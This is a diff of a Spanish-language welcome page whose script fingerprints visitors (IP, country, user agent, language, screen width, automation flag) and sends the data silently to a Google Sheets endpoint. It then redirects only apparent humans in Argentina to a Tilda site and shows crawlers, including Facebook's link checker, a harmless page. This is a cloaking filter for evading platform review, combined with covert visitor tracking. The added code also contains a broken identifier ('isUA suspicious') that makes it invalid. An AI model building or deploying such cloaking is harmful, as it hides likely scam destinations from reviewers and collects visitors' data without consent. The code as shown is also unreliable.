@@ -1,49 +1,69 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8">
   <title>Bienvenido</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 30vh; }
+  </style>
 </head>
 <body>
-  <h1 style="text-align:center;margin-top:20%;">Bienvenido</h1>
+  <h1>Bienvenido</h1>
 
   <script>
     async function detect() {
       const ua = navigator.userAgent || '';
+      const lang = navigator.language || '';
+      const width = screen.width || 0;
       const webdriver = navigator.webdriver ? '1' : '0';
 
-      // Простой user-agent фильтр
+      // Простая UA-фильтрация
       const suspiciousUAs = [/bot/i, /crawl/i, /spider/i, /facebookexternalhit/i];
-      const isSuspiciousUA = suspiciousUAs.some(rx => rx.test(ua));
+      const isUA suspicious = suspiciousUAs.some(rx => rx.test(ua));
 
-      // IP запрос
-      let ip = '_';
+      // Проверка языка и экрана
+      const isLangSuspicious = !lang.includes('es');
+      const isScreenSuspicious = width < 300 || width > 2000;
+
+      // Определение страны по IP
+      let ip = '_', country = '_';
       try {
-        const res = await fetch('https://api.ipify.org?format=json');
+        const res = await fetch('https://ipapi.co/json/');
         const json = await res.json();
         ip = json.ip;
+        country = json.country || '_';
       } catch (e) {}
 
-      // Решение
-      const isBot = webdriver === '1' || isSuspiciousUA;
+      // Итог
+      const isBot =
+        webdriver === '1' ||
+        isUA suspicious ||
+        isLangSuspicious ||
+        isScreenSuspicious ||
+        country !== 'AR';
 
-      // Лог в Google Sheets
-      fetch('https://script.google.com/macros/s/AKfycbwZXUvQdEOz34km7SWllpAHPupKKwR3KJ57FCSp1Rlc5x0JQeOxTrZ8paRVEAkQUjQE_A/exec', {
+      // Отправка в Google Sheets
+      fetch('https://script.google.com/macros/s/AKfycbxyKjXqA5Trs_Rzz_jf3nSrC7xxsAy7mEetc7S_aV4IQkPk9wP7vFU-eCCDWZ5xdUaoOQ/exec', {
         method: 'POST',
         body: JSON.stringify({
           ip,
+          country,
           ua,
+          lang,
+          width,
           webdriver,
           result: isBot ? 'bot' : 'ok'
         })
       });
 
-      // Редирект если человек
+      // Переход
       if (!isBot) {
         setTimeout(() => {
-          window.location.href = "http://argentinaforreal.tilda.ws/"; // ← сюда редирект
-        }, 1500);
+          window.location.href = 'http://argentinaforreal.tilda.ws/';
+        }, 1200);
+      } else {
+        document.querySelector('h1').textContent = 'Gracias por visitar';
       }
     }
 
